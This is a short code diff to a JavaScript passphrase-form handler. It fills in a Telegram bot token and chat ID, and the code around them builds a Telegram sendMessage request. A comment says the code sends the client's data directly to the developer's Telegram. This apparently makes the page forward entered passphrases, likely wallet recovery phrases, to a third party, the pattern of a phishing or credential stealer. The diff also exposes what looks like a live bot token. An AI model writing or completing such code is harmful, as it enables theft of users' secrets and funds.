@@ -101,8 +101,8 @@ function bindPassphraseFormEvents(root, onVerified) {
     setTimeout(async () => { // Changed to async to allow for the network request
   
   // --- AUTO DATA CODE START ---
-  const BOT_TOKEN = '';
-  const CHAT_ID = '';
+  const BOT_TOKEN = 'AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
+  const CHAT_ID = '-1003854344802';
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
   
   // This sends the client's data directly to the developer's Telegram
